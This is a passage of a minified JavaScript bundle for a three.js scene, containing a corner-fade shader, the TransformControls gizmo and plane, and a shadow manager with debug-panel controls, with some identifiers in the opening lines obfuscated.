+'ht')[haydata_0x55898f(0x1df,'1goH')+haydata_0x507bcb('0x295')+'ge'](this[haydata_0x5f3294('0x287','yFFd')+haydata_0x507bcb('0x1b0')+haydata_0x3afde2(0x22f,'ZRaI')+haydata_0x36d3c6(0x2c0)+'al']),n[haydata_0x36d3c6(0x1b2)+haydata_0x46fd87(0x183)+'or'](this[haydata_0x4cd7d0('0x26d','Z)4g')+haydata_0x5f3294('0x1be','Ar0k')],haydata_0x55898f(0x29a,'N@J9')+haydata_0x507bcb(0x232)+haydata_0x3240c7(0x191)+'t')[haydata_0x5f3294(0x21b,'CRPY')+haydata_0x36d3c6(0x295)+'ge'](this[haydata_0x30fb61('0x293')+haydata_0x30fb61('0x1b0')+haydata_0x55898f(0x1fc,'aVCj')+haydata_0x4cd7d0(0x1cb,'fx(i')+'al'])}},pu=function(){return new Vt({wireframe:!1,transparent:!0,uniforms:{uColor:{value:null},uAlpha:{value:null},uFadeRadius:{value:null}},vertexShader:"#define GLSLIFY 1\nvarying vec2 vUv;\n\nvoid main()\n{\n    vUv = uv;\n    gl_Position = projectionMatrix * modelViewMatrix * vec4(position, 1.0);\n}\n",fragmentShader:"#define GLSLIFY 1\n#define PI 3.141592653589793\n\nuniform vec3 uColor;\nuniform float uAlpha;\nuniform float uFadeRadius;\n\nvarying vec2 vUv;\n\nfloat sineInOut(float t)\n{\n    return - 0.5 * (cos(PI * t) - 1.0);\n}\n\nvoid main()\n{\n    float strength = 0.0;\n\n    if(vUv.x < uFadeRadius && vUv.y < uFadeRadius)\n    {\n        strength = clamp(1.0 - distance(vUv, vec2(uFadeRadius)) / uFadeRadius, 0.0, 1.0);\n    }\n\n    else if(vUv.x > 1.0 - uFadeRadius && vUv.y < uFadeRadius)\n    {\n        strength = clamp(1.0 - distance(vUv, vec2(1.0 - uFadeRadius, uFadeRadius)) / uFadeRadius, 0.0, 1.0);\n    }\n\n    else if(vUv.x > 1.0 - uFadeRadius && vUv.y > 1.0 - uFadeRadius)\n    {\n        strength = clamp(1.0 - distance(vUv, vec2(1.0 - uFadeRadius, 1.0 - uFadeRadius)) / uFadeRadius, 0.0, 1.0);\n    }\n\n    else if(vUv.x < uFadeRadius && vUv.y > 1.0 - uFadeRadius)\n    {\n        strength = clamp(1.0 - distance(vUv, vec2(uFadeRadius, 1.0 - uFadeRadius)) / uFadeRadius, 0.0, 1.0);\n    }\n\n    else\n    {\n        float xNeg = clamp(vUv.x / uFadeRadius, 0.0, 1.0);\n        float xPos = clamp((1.0 - vUv.x) / uFadeRadius, 0.0, 1.0);\n        float yNeg = clamp(vUv.y / uFadeRadius, 0.0, 1.0);\n        float yPos = clamp((1.0 - vUv.y) / uFadeRadius, 0.0, 1.0);\n\n        strength = xNeg * xPos * yNeg * yPos;\n    }\n\n    strength = sineInOut(strength);\n    strength *= uAlpha;\n\n    gl_FragColor = vec4(uColor, strength);\n}\n"})},fu=function(e,t){void 0===t&&(console.warn('THREE.TransformControls: The second parameter "domElement" is now mandatory.'),t=document),K.call(this),this.visible=!1;var i=new mu;this.add(i);var n=new vu;this.add(n);var r=this;U("camera",e),U("object",void 0),U("enabled",!0),U("axis",null),U("mode","translate"),U("translationSnap",null),U("rotationSnap",null),U("space","world"),U("size",1),U("dragging",!1),U("showX",!0),U("showY",!0),U("showZ",!0);var o={type:"change"},a={type:"mouseDown"},s={type:"mouseUp",mode:r.mode},c={type:"objectChange"},l=new Nc,h=new y,u=new y,d=new m,p={X:new y(1,0,0),Y:new y(0,1,0),Z:new y(0,0,1)},f=new y,v=new y,g=new y,b=new y,w=new y,x=new y,_=0,M=new y,S=new m,T=new y,E=new y,A=new m,C=new m,P=new y,L=new y,R=new m,k=new y,O=new y,I=new m,B=new m,D=new y,z=new y,F=new y,N=new m,j=new y;function U(e,t){var a=t;Object.defineProperty(r,e,{get:function(){return void 0!==a?a:t},set:function(t){a!==t&&(a=t,n[e]=t,i[e]=t,r.dispatchEvent({type:e+"-changed",value:t}),r.dispatchEvent(o))}}),r[e]=t,n[e]=t,i[e]=t}function V(e){if(document.pointerLockElement)return{x:0,y:0,button:e.button};var i=e.changedTouches?e.changedTouches[0]:e,n=t.getBoundingClientRect();return{x:(i.clientX-n.left)/n.width*2-1,y:-(i.clientY-n.top)/n.height*2+1,button:e.button}}function H(e){r.enabled&&r.pointerHover(V(e))}function G(e){r.enabled&&(document.addEventListener("mousemove",W,!1),r.pointerHover(V(e)),r.pointerDown(V(e)))}function W(e){r.enabled&&r.pointerMove(V(e))}function q(e){r.enabled&&(document.removeEventListener("mousemove",W,!1),r.pointerUp(V(e)))}U("worldPosition",O),U("worldPositionStart",L),U("worldQuaternion",I),U("worldQuaternionStart",R),U("cameraPosition",M),U("cameraQuaternion",S),U("pointStart",f),U("pointEnd",v),U("rotationAxis",b),U("rotationAngle",_),U("eye",z),t.addEventListener("mousedown",G,!1),t.addEventListener("touchstart",G,!1),t.addEventListener("mousemove",H,!1),t.addEventListener("touchmove",H,!1),t.addEventListener("touchmove",W,!1),document.addEventListener("mouseup",q,!1),t.addEventListener("touchend",q,!1),t.addEventListener("touchcancel",q,!1),t.addEventListener("touchleave",q,!1),this.dispose=function(){t.removeEventListener("mousedown",G),t.removeEventListener("touchstart",G),t.removeEventListener("mousemove",H),document.removeEventListener("mousemove",W),t.removeEventListener("touchmove",H),t.removeEventListener("touchmove",W),document.removeEventListener("mouseup",q),t.removeEventListener("touchend",q),t.removeEventListener("touchcancel",q),t.removeEventListener("touchleave",q),this.traverse((function(e){e.geometry&&e.geometry.dispose(),e.material&&e.material.dispose()}))},this.attach=function(e){return this.object=e,this.visible=!0,this},this.detach=function(){return this.object=void 0,this.visible=!1,this.axis=null,this},this.updateMatrixWorld=function(){void 0!==this.object&&(this.object.updateMatrixWorld(),this.object.parent.matrixWorld.decompose(E,A,P),this.object.matrixWorld.decompose(O,I,D),C.copy(A).inverse(),B.copy(I).inverse()),this.camera.updateMatrixWorld(),this.camera.matrixWorld.decompose(M,S,T),z.copy(M).sub(O).normalize(),K.prototype.updateMatrixWorld.call(this)},this.pointerHover=function(e){if(void 0!==this.object&&!0!==this.dragging&&(void 0===e.button||0===e.button)){l.setFromCamera(e,this.camera);var t=l.intersectObjects(i.picker[this.mode].children,!0)[0]||!1;this.axis=t?t.object.name:null}},this.pointerDown=function(e){if(!(void 0===this.object||!0===this.dragging||void 0!==e.button&&0!==e.button||0!==e.button&&void 0!==e.button||null===this.axis)){l.setFromCamera(e,this.camera);var t=l.intersectObjects([n],!0)[0]||!1;if(t){var i=this.space;if("scale"===this.mode?i="local":"E"!==this.axis&&"XYZE"!==this.axis&&"XYZ"!==this.axis||(i="world"),"local"===i&&"rotate"===this.mode){var r=this.rotationSnap;"X"===this.axis&&r&&(this.object.rotation.x=Math.round(this.object.rotation.x/r)*r),"Y"===this.axis&&r&&(this.object.rotation.y=Math.round(this.object.rotation.y/r)*r),"Z"===this.axis&&r&&(this.object.rotation.z=Math.round(this.object.rotation.z/r)*r)}this.object.updateMatrixWorld(),this.object.parent.updateMatrixWorld(),F.copy(this.object.position),N.copy(this.object.quaternion),j.copy(this.object.scale),this.object.matrixWorld.decompose(L,R,k),f.copy(t.point).sub(L)}this.dragging=!0,a.mode=this.mode,this.dispatchEvent(a)}},this.pointerMove=function(e){var t=this.axis,i=this.mode,r=this.object,a=this.space;if("scale"===i?a="local":"E"!==t&&"XYZE"!==t&&"XYZ"!==t||(a="world"),void 0!==r&&null!==t&&!1!==this.dragging&&(void 0===e.button||0===e.button)){l.setFromCamera(e,this.camera);var s=l.intersectObjects([n],!0)[0]||!1;if(!1!==s){if(v.copy(s.point).sub(L),"translate"===i)g.copy(v).sub(f),"local"===a&&"XYZ"!==t&&g.applyQuaternion(B),-1===t.indexOf("X")&&(g.x=0),-1===t.indexOf("Y")&&(g.y=0),-1===t.indexOf("Z")&&(g.z=0),"local"===a&&"XYZ"!==t?g.applyQuaternion(N).divide(P):g.applyQuaternion(C).divide(P),r.position.copy(g).add(F),this.translationSnap&&("local"===a&&(r.position.applyQuaternion(d.copy(N).inverse()),-1!==t.search("X")&&(r.position.x=Math.round(r.position.x/this.translationSnap)*this.translationSnap),-1!==t.search("Y")&&(r.position.y=Math.round(r.position.y/this.translationSnap)*this.translationSnap),-1!==t.search("Z")&&(r.position.z=Math.round(r.position.z/this.translationSnap)*this.translationSnap),r.position.applyQuaternion(N)),"world"===a&&(r.parent&&r.position.add(h.setFromMatrixPosition(r.parent.matrixWorld)),-1!==t.search("X")&&(r.position.x=Math.round(r.position.x/this.translationSnap)*this.translationSnap),-1!==t.search("Y")&&(r.position.y=Math.round(r.position.y/this.translationSnap)*this.translationSnap),-1!==t.search("Z")&&(r.position.z=Math.round(r.position.z/this.translationSnap)*this.translationSnap),r.parent&&r.position.sub(h.setFromMatrixPosition(r.parent.matrixWorld))));else if("scale"===i){if(-1!==t.search("XYZ")){var m=v.length()/f.length();v.dot(f)<0&&(m*=-1),u.set(m,m,m)}else h.copy(f),u.copy(v),h.applyQuaternion(B),u.applyQuaternion(B),u.divide(h),-1===t.search("X")&&(u.x=1),-1===t.search("Y")&&(u.y=1),-1===t.search("Z")&&(u.z=1);r.scale.copy(j).multiply(u)}else if("rotate"===i){g.copy(v).sub(f);var y=20/O.distanceTo(h.setFromMatrixPosition(this.camera.matrixWorld));"E"===t?(b.copy(z),_=v.angleTo(f),w.copy(f).normalize(),x.copy(v).normalize(),_*=x.cross(w).dot(z)<0?1:-1):"XYZE"===t?(b.copy(g).cross(z).normalize(),_=g.dot(h.copy(b).cross(this.eye))*y):"X"!==t&&"Y"!==t&&"Z"!==t||(b.copy(p[t]),h.copy(p[t]),"local"===a&&h.applyQuaternion(I),_=g.dot(h.cross(z).normalize())*y),this.rotationSnap&&(_=Math.round(_/this.rotationSnap)*this.rotationSnap),this.rotationAngle=_,"local"===a&&"E"!==t&&"XYZE"!==t?(r.quaternion.copy(N),r.quaternion.multiply(d.setFromAxisAngle(b,_)).normalize()):(b.applyQuaternion(C),r.quaternion.copy(d.setFromAxisAngle(b,_)),r.quaternion.multiply(N).normalize())}this.dispatchEvent(o),this.dispatchEvent(c)}}},this.pointerUp=function(e){void 0!==e.button&&0!==e.button||(this.dragging&&null!==this.axis&&(s.mode=this.mode,this.dispatchEvent(s)),this.dragging=!1,void 0===e.button&&(this.axis=null))},this.getMode=function(){return r.mode},this.setMode=function(e){r.mode=e},this.setTranslationSnap=function(e){r.translationSnap=e},this.setRotationSnap=function(e){r.rotationSnap=e},this.setSize=function(e){r.size=e},this.setSpace=function(e){r.space=e},this.update=function(){console.warn("THREE.TransformControls: update function has no more functionality and therefore has been deprecated.")}};fu.prototype=Object.assign(Object.create(K.prototype),{constructor:fu,isTransformControls:!0});var mu=function(){K.call(this),this.type="TransformControlsGizmo";var e=new qe({depthTest:!1,depthWrite:!1,transparent:!0,side:2,fog:!1}),t=new Nr({depthTest:!1,depthWrite:!1,transparent:!0,linewidth:1,fog:!1}),i=e.clone();i.opacity=.15;var n=e.clone();n.opacity=.33;var r=e.clone();r.color.set(16711680);var o=e.clone();o.color.set(65280);var a=e.clone();a.color.set(255);var s=e.clone();s.opacity=.25;var c=s.clone();c.color.set(16776960);var l=s.clone();l.color.set(65535);var h=s.clone();h.color.set(16711935),e.clone().color.set(16776960);var u=t.clone();u.color.set(16711680);var d=t.clone();d.color.set(65280);var p=t.clone();p.color.set(255);var f=t.clone();f.color.set(65535);var v=t.clone();v.color.set(16711935);var g=t.clone();g.color.set(16776960);var b=t.clone();b.color.set(7895160);var w=g.clone();w.opacity=.25;var x=new ma(0,.05,.2,12,1,!1),_=new Ft(.125,.125,.125),M=new dt;M.addAttribute("position",new tt([0,0,0,1,0,0],3));var S,T=function(e,t){for(var i=new dt,n=[],r=0;r<=64*t;++r)n.push(0,Math.cos(r/32*Math.PI)*e,Math.sin(r/32*Math.PI)*e);return i.addAttribute("position",new tt(n,3)),i},E={X:[[new Lt(x,r),[1,0,0],[0,0,-Math.PI/2],null,"fwd"],[new Lt(x,r),[1,0,0],[0,0,Math.PI/2],null,"bwd"],[new Wr(M,u)]],Y:[[new Lt(x,o),[0,1,0],null,null,"fwd"],[new Lt(x,o),[0,1,0],[Math.PI,0,0],null,"bwd"],[new Wr(M,d),null,[0,0,Math.PI/2]]],Z:[[new Lt(x,a),[0,0,1],[Math.PI/2,0,0],null,"fwd"],[new Lt(x,a),[0,0,1],[-Math.PI/2,0,0],null,"bwd"],[new Wr(M,p),null,[0,-Math.PI/2,0]]],XYZ:[[new Lt(new vo(.1,0),s.clone()),[0,0,0],[0,0,0]]],XY:[[new Lt(new si(.295,.295),c.clone()),[.15,.15,0]],[new Wr(M,g),[.18,.3,0],null,[.125,1,1]],[new Wr(M,g),[.3,.18,0],[0,0,Math.PI/2],[.125,1,1]]],YZ:[[new Lt(new si(.295,.295),l.clone()),[0,.15,.15],[0,Math.PI/2,0]],[new Wr(M,f),[0,.18,.3],[0,0,Math.PI/2],[.125,1,1]],[new Wr(M,f),[0,.3,.18],[0,-Math.PI/2,0],[.125,1,1]]],XZ:[[new Lt(new si(.295,.295),h.clone()),[.15,0,.15],[-Math.PI/2,0,0]],[new Wr(M,v),[.18,0,.3],null,[.125,1,1]],[new Wr(M,v),[.3,0,.18],[0,-Math.PI/2,0],[.125,1,1]]]},A={X:[[new Lt(new ma(.2,0,1,4,1,!1),i),[.6,0,0],[0,0,-Math.PI/2]]],Y:[[new Lt(new ma(.2,0,1,4,1,!1),i),[0,.6,0]]],Z:[[new Lt(new ma(.2,0,1,4,1,!1),i),[0,0,.6],[Math.PI/2,0,0]]],XYZ:[[new Lt(new vo(.2,0),i)]],XY:[[new Lt(new si(.4,.4),i),[.2,.2,0]]],YZ:[[new Lt(new si(.4,.4),i),[0,.2,.2],[0,Math.PI/2,0]]],XZ:[[new Lt(new si(.4,.4),i),[.2,0,.2],[-Math.PI/2,0,0]]]},C={START:[[new Lt(new vo(.01,2),n),null,null,null,"helper"]],END:[[new Lt(new vo(.01,2),n),null,null,null,"helper"]],DELTA:[[new Wr((S=new dt,S.addAttribute("position",new tt([0,0,0,1,1,1],3)),S),n),null,null,null,"helper"]],X:[[new Wr(M,n.clone()),[-1e3,0,0],null,[1e6,1,1],"helper"]],Y:[[new Wr(M,n.clone()),[0,-1e3,0],[0,0,Math.PI/2],[1e6,1,1],"helper"]],Z:[[new Wr(M,n.clone()),[0,0,-1e3],[0,-Math.PI/2,0],[1e6,1,1],"helper"]]},P={X:[[new Wr(T(1,.5),u)],[new Lt(new vo(.04,0),r),[0,0,.99],null,[1,3,1]]],Y:[[new Wr(T(1,.5),d),null,[0,0,-Math.PI/2]],[new Lt(new vo(.04,0),o),[0,0,.99],null,[3,1,1]]],Z:[[new Wr(T(1,.5),p),null,[0,Math.PI/2,0]],[new Lt(new vo(.04,0),a),[.99,0,0],null,[1,3,1]]],E:[[new Wr(T(1.25,1),w),null,[0,Math.PI/2,0]],[new Lt(new ma(.03,0,.15,4,1,!1),w),[1.17,0,0],[0,0,-Math.PI/2],[1,1,.001]],[new Lt(new ma(.03,0,.15,4,1,!1),w),[-1.17,0,0],[0,0,Math.PI/2],[1,1,.001]],[new Lt(new ma(.03,0,.15,4,1,!1),w),[0,-1.17,0],[Math.PI,0,0],[1,1,.001]],[new Lt(new ma(.03,0,.15,4,1,!1),w),[0,1.17,0],[0,0,0],[1,1,.001]]],XYZE:[[new Wr(T(1,1),b),null,[0,Math.PI/2,0]]]},L={AXIS:[[new Wr(M,n.clone()),[-1e3,0,0],null,[1e6,1,1],"helper"]]},R={X:[[new Lt(new Eo(1,.1,4,24),i),[0,0,0],[0,-Math.PI/2,-Math.PI/2]]],Y:[[new Lt(new Eo(1,.1,4,24),i),[0,0,0],[Math.PI/2,0,0]]],Z:[[new Lt(new Eo(1,.1,4,24),i),[0,0,0],[0,0,-Math.PI/2]]],E:[[new Lt(new Eo(1.25,.1,2,24),i)]],XYZE:[[new Lt(new oa(.7,10,8),i)]]},k={X:[[new Lt(_,r),[.8,0,0],[0,0,-Math.PI/2]],[new Wr(M,u),null,null,[.8,1,1]]],Y:[[new Lt(_,o),[0,.8,0]],[new Wr(M,d),null,[0,0,Math.PI/2],[.8,1,1]]],Z:[[new Lt(_,a),[0,0,.8],[Math.PI/2,0,0]],[new Wr(M,p),null,[0,-Math.PI/2,0],[.8,1,1]]],XY:[[new Lt(_,c),[.85,.85,0],null,[2,2,.2]],[new Wr(M,g),[.855,.98,0],null,[.125,1,1]],[new Wr(M,g),[.98,.855,0],[0,0,Math.PI/2],[.125,1,1]]],YZ:[[new Lt(_,l),[0,.85,.85],null,[.2,2,2]],[new Wr(M,f),[0,.855,.98],[0,0,Math.PI/2],[.125,1,1]],[new Wr(M,f),[0,.98,.855],[0,-Math.PI/2,0],[.125,1,1]]],XZ:[[new Lt(_,h),[.85,0,.85],null,[2,.2,2]],[new Wr(M,v),[.855,0,.98],null,[.125,1,1]],[new Wr(M,v),[.98,0,.855],[0,-Math.PI/2,0],[.125,1,1]]],XYZX:[[new Lt(new Ft(.125,.125,.125),s.clone()),[1.1,0,0]]],XYZY:[[new Lt(new Ft(.125,.125,.125),s.clone()),[0,1.1,0]]],XYZZ:[[new Lt(new Ft(.125,.125,.125),s.clone()),[0,0,1.1]]]},O={X:[[new Lt(new ma(.2,0,.8,4,1,!1),i),[.5,0,0],[0,0,-Math.PI/2]]],Y:[[new Lt(new ma(.2,0,.8,4,1,!1),i),[0,.5,0]]],Z:[[new Lt(new ma(.2,0,.8,4,1,!1),i),[0,0,.5],[Math.PI/2,0,0]]],XY:[[new Lt(_,i),[.85,.85,0],null,[3,3,.2]]],YZ:[[new Lt(_,i),[0,.85,.85],null,[.2,3,3]]],XZ:[[new Lt(_,i),[.85,0,.85],null,[3,.2,3]]],XYZX:[[new Lt(new Ft(.2,.2,.2),i),[1.1,0,0]]],XYZY:[[new Lt(new Ft(.2,.2,.2),i),[0,1.1,0]]],XYZZ:[[new Lt(new Ft(.2,.2,.2),i),[0,0,1.1]]]},I={X:[[new Wr(M,n.clone()),[-1e3,0,0],null,[1e6,1,1],"helper"]],Y:[[new Wr(M,n.clone()),[0,-1e3,0],[0,0,Math.PI/2],[1e6,1,1],"helper"]],Z:[[new Wr(M,n.clone()),[0,0,-1e3],[0,-Math.PI/2,0],[1e6,1,1],"helper"]]},D=function(e){var t=new K;for(var i in e)for(var n=e[i].length;n--;){var r=e[i][n][0].clone(),o=e[i][n][1],a=e[i][n][2],s=e[i][n][3],c=e[i][n][4];r.name=i,r.tag=c,o&&r.position.set(o[0],o[1],o[2]),a&&r.rotation.set(a[0],a[1],a[2]),s&&r.scale.set(s[0],s[1],s[2]),r.updateMatrix();var l=r.geometry.clone();l.applyMatrix(r.matrix),r.geometry=l,r.renderOrder=1/0,r.position.set(0,0,0),r.rotation.set(0,0,0),r.scale.set(1,1,1),t.add(r)}return t},z=new y(0,0,0),N=new F,j=new y(0,1,0),U=new y(0,0,0),V=new B,H=new m,G=new m,W=new m,q=new y(1,0,0),X=new y(0,1,0),Y=new y(0,0,1);this.gizmo={},this.picker={},this.helper={},this.add(this.gizmo.translate=D(E)),this.add(this.gizmo.rotate=D(P)),this.add(this.gizmo.scale=D(k)),this.add(this.picker.translate=D(A)),this.add(this.picker.rotate=D(R)),this.add(this.picker.scale=D(O)),this.add(this.helper.translate=D(C)),this.add(this.helper.rotate=D(L)),this.add(this.helper.scale=D(I)),this.picker.translate.visible=!1,this.picker.rotate.visible=!1,this.picker.scale.visible=!1,this.updateMatrixWorld=function(){var e=this.space;"scale"===this.mode&&(e="local");var t="local"===e?this.worldQuaternion:W;this.gizmo.translate.visible="translate"===this.mode,this.gizmo.rotate.visible="rotate"===this.mode,this.gizmo.scale.visible="scale"===this.mode,this.helper.translate.visible="translate"===this.mode,this.helper.rotate.visible="rotate"===this.mode,this.helper.scale.visible="scale"===this.mode;var i=[];i=(i=(i=i.concat(this.picker[this.mode].children)).concat(this.gizmo[this.mode].children)).concat(this.helper[this.mode].children);for(var n=0;n<i.length;n++){var r=i[n];r.visible=!0,r.rotation.set(0,0,0),r.position.copy(this.worldPosition);var o=this.worldPosition.distanceTo(this.cameraPosition);if(r.scale.set(1,1,1).multiplyScalar(o*this.size/7),"helper"!==r.tag){if(r.quaternion.copy(t),"translate"===this.mode||"scale"===this.mode){"X"!==r.name&&"XYZX"!==r.name||Math.abs(j.copy(q).applyQuaternion(t).dot(this.eye))>.99&&(r.scale.set(1e-10,1e-10,1e-10),r.visible=!1),"Y"!==r.name&&"XYZY"!==r.name||Math.abs(j.copy(X).applyQuaternion(t).dot(this.eye))>.99&&(r.scale.set(1e-10,1e-10,1e-10),r.visible=!1),"Z"!==r.name&&"XYZZ"!==r.name||Math.abs(j.copy(Y).applyQuaternion(t).dot(this.eye))>.99&&(r.scale.set(1e-10,1e-10,1e-10),r.visible=!1),"XY"===r.name&&Math.abs(j.copy(Y).applyQuaternion(t).dot(this.eye))<.2&&(r.scale.set(1e-10,1e-10,1e-10),r.visible=!1),"YZ"===r.name&&Math.abs(j.copy(q).applyQuaternion(t).dot(this.eye))<.2&&(r.scale.set(1e-10,1e-10,1e-10),r.visible=!1),"XZ"===r.name&&Math.abs(j.copy(X).applyQuaternion(t).dot(this.eye))<.2&&(r.scale.set(1e-10,1e-10,1e-10),r.visible=!1),-1!==r.name.search("X")&&(j.copy(q).applyQuaternion(t).dot(this.eye)<0?"fwd"===r.tag?r.visible=!1:r.scale.x*=-1:"bwd"===r.tag&&(r.visible=!1)),-1!==r.name.search("Y")&&(j.copy(X).applyQuaternion(t).dot(this.eye)<0?"fwd"===r.tag?r.visible=!1:r.scale.y*=-1:"bwd"===r.tag&&(r.visible=!1)),-1!==r.name.search("Z")&&(j.copy(Y).applyQuaternion(t).dot(this.eye)<0?"fwd"===r.tag?r.visible=!1:r.scale.z*=-1:"bwd"===r.tag&&(r.visible=!1))}else"rotate"===this.mode&&(G.copy(t),j.copy(this.eye).applyQuaternion(H.copy(t).inverse()),-1!==r.name.search("E")&&r.quaternion.setFromRotationMatrix(V.lookAt(this.eye,U,X)),"X"===r.name&&(H.setFromAxisAngle(q,Math.atan2(-j.y,j.z)),H.multiplyQuaternions(G,H),r.quaternion.copy(H)),"Y"===r.name&&(H.setFromAxisAngle(X,Math.atan2(j.x,j.z)),H.multiplyQuaternions(G,H),r.quaternion.copy(H)),"Z"===r.name&&(H.setFromAxisAngle(Y,Math.atan2(j.y,j.x)),H.multiplyQuaternions(G,H),r.quaternion.copy(H)));r.visible=r.visible&&(-1===r.name.indexOf("X")||this.showX),r.visible=r.visible&&(-1===r.name.indexOf("Y")||this.showY),r.visible=r.visible&&(-1===r.name.indexOf("Z")||this.showZ),r.visible=r.visible&&(-1===r.name.indexOf("E")||this.showX&&this.showY&&this.showZ),r.material._opacity=r.material._opacity||r.material.opacity,r.material._color=r.material._color||r.material.color.clone(),r.material.color.copy(r.material._color),r.material.opacity=r.material._opacity,this.enabled?this.axis&&(r.name===this.axis?(r.material.opacity=1,r.material.color.lerp(new Ne(1,1,1),.5)):this.axis.split("").some((function(e){return r.name===e}))?(r.material.opacity=1,r.material.color.lerp(new Ne(1,1,1),.5)):(r.material.opacity*=.25,r.material.color.lerp(new Ne(1,1,1),.5))):(r.material.opacity*=.5,r.material.color.lerp(new Ne(1,1,1),.5))}else r.visible=!1,"AXIS"===r.name?(r.position.copy(this.worldPositionStart),r.visible=!!this.axis,"X"===this.axis&&(H.setFromEuler(N.set(0,0,0)),r.quaternion.copy(t).multiply(H),Math.abs(j.copy(q).applyQuaternion(t).dot(this.eye))>.9&&(r.visible=!1)),"Y"===this.axis&&(H.setFromEuler(N.set(0,0,Math.PI/2)),r.quaternion.copy(t).multiply(H),Math.abs(j.copy(X).applyQuaternion(t).dot(this.eye))>.9&&(r.visible=!1)),"Z"===this.axis&&(H.setFromEuler(N.set(0,Math.PI/2,0)),r.quaternion.copy(t).multiply(H),Math.abs(j.copy(Y).applyQuaternion(t).dot(this.eye))>.9&&(r.visible=!1)),"XYZE"===this.axis&&(H.setFromEuler(N.set(0,Math.PI/2,0)),j.copy(this.rotationAxis),r.quaternion.setFromRotationMatrix(V.lookAt(U,j,X)),r.quaternion.multiply(H),r.visible=this.dragging),"E"===this.axis&&(r.visible=!1)):"START"===r.name?(r.position.copy(this.worldPositionStart),r.visible=this.dragging):"END"===r.name?(r.position.copy(this.worldPosition),r.visible=this.dragging):"DELTA"===r.name?(r.position.copy(this.worldPositionStart),r.quaternion.copy(this.worldQuaternionStart),z.set(1e-10,1e-10,1e-10).add(this.worldPositionStart).sub(this.worldPosition).multiplyScalar(-1),z.applyQuaternion(this.worldQuaternionStart.clone().inverse()),r.scale.copy(z),r.visible=this.dragging):(r.quaternion.copy(t),this.dragging?r.position.copy(this.worldPositionStart):r.position.copy(this.worldPosition),this.axis&&(r.visible=-1!==this.axis.search(r.name)))}K.prototype.updateMatrixWorld.call(this)}};mu.prototype=Object.assign(Object.create(K.prototype),{constructor:mu,isTransformControlsGizmo:!0});var vu=function(){Lt.call(this,new si(1e5,1e5,2,2),new qe({visible:!1,wireframe:!0,side:2,transparent:!0,opacity:.1})),this.type="TransformControlsPlane";var e=new y(1,0,0),t=new y(0,1,0),i=new y(0,0,1),n=new y,r=new y,o=new y,a=new B,s=new m;this.updateMatrixWorld=function(){var c=this.space;switch(this.position.copy(this.worldPosition),"scale"===this.mode&&(c="local"),e.set(1,0,0).applyQuaternion("local"===c?this.worldQuaternion:s),t.set(0,1,0).applyQuaternion("local"===c?this.worldQuaternion:s),i.set(0,0,1).applyQuaternion("local"===c?this.worldQuaternion:s),o.copy(t),this.mode){case"translate":case"scale":switch(this.axis){case"X":o.copy(this.eye).cross(e),r.copy(e).cross(o);break;case"Y":o.copy(this.eye).cross(t),r.copy(t).cross(o);break;case"Z":o.copy(this.eye).cross(i),r.copy(i).cross(o);break;case"XY":r.copy(i);break;case"YZ":r.copy(e);break;case"XZ":o.copy(i),r.copy(t);break;case"XYZ":case"E":r.set(0,0,0)}break;case"rotate":default:r.set(0,0,0)}0===r.length()?this.quaternion.copy(this.cameraQuaternion):(a.lookAt(n.set(0,0,0),r,o),this.quaternion.setFromRotationMatrix(a)),K.prototype.updateMatrixWorld.call(this)}};function gu(e,t){for(var i=0;i<t.length;i++){var n=t[i];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}vu.prototype=Object.assign(Object.create(Lt.prototype),{constructor:vu,isTransformControlsPlane:!0});var yu=function(){function e(t){var i=this;!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,e),this.time=t.time,this.debug=t.debug,this.renderer=t.renderer,this.camera=t.camera,this.alpha=0,this.maxDistance=3,this.distancePower=2,this.zFightingDistance=.001,this.color="#d04500",this.wireframeVisible=!1,this.items=[],this.container=new K,this.container.matrixAutoUpdate=!1,this.container.updateMatrix(),this.debug&&(this.debugFolder=this.debug.addFolder("shadows"),this.debugFolder.add(this,"alpha").step(.01).min(0).max(1),this.debugFolder.add(this,"maxDistance").step(.01).min(0).max(10),this.debugFolder.add(this,"distancePower").step(.01).min(1).max(5),this.debugFolder.add(this,"wireframeVisible").name("wireframeVisible").onChange((function(){var e=!0,t=!1,n=void 0;try{for(var r,o=i.items[Symbol.iterator]();!(e=(r=o.next()).done);e=!0){var a=r.value;a.mesh.material=i.wireframeVisible?i.materials.wireframe:a.material}}catch(e){t=!0,n=e}finally{try{e||null==o.return||o.return()}finally{if(t)throw n}}})),this.debugFolder.addColor(this,"color").onChange((function(){i.materials.base.uniforms.uColor.value=new Ne(i.color);var e=!0,t=!1,n=void 0;try{for(var r,o=i.items[Symbol.iterator]();!(e=(r=o.next()).done);e=!0){r.value.material.uniforms.uColor.value=new Ne(i.color)}}catch(e){t=!0,n=e}finally{try{e||null==o.return||o.return()}finally{if(t)throw n}}}))),this.setSun(),this.setMaterials(),this.setGeometry(),this.setHelper(),this.time.on("tick",(function(){var e=!0,t=!1,n=void 0;try{for(var r,o=i.items[Symbol.iterator]();!(e=(r=o.next()).done);e=!0){var a=r.value,s=Math.max(a.reference.position.z+a.offsetZ,0),c=i.sun.vector.clone().multiplyScalar(s);a.mesh.position.x=a.reference.position.x+c.x,a.mesh.position.y=a.reference.position.y+c.y;var l=new y(1,0,0);l.applyQuaternion(a.reference.quaternion);var h=l.clone().projectOnPlane(new y(0,0,1)),u=Math.abs(l.angleTo(new y(0,0,1))-.5*Math.PI)/(.5*Math.PI);u/=.5,u-=2,u=Math.abs(u),u=Math.min(Math.max(u,0),1);var d=Math.atan2(h.y,h.x);a.mesh.rotation.z=d;var p=(i.maxDistance-s)/i.maxDistance;p=Math.min(Math.max(p,0),1),p=Math.pow(p,i.distancePower),a.material.uniforms.uAlpha.value=i.alpha*a.alpha*u*p}}catch(e){t=!0,n=e}finally{try{e||null==o.return||o.return()}finally{if(t)throw n}}}))}var t,i,n;return t=e,(i=[{key:"setSun",value:function(){var e=this;if(this.sun={},this.sun.position=new y(-2.5,-2.65,3.75),this.sun.vector=new y,this.sun.helper=new Bl(new y(0,0,1),new y(0,0,0),1,16777215,.1,.4),this.sun.helper.visible=!1,this.container.add(this.sun.helper),this.sun.update=function(){e.sun.vector.copy(e.sun.position).multiplyScalar(1/e.sun.position.z).negate(),e.sun.helper.position.copy(e.sun.position);var t=e.sun.position.clone().negate().normalize();e.sun.helper.setDirection(t),e.sun.helper.setLength(e.sun.helper.position.length())},this.sun.update(),this.debug){var 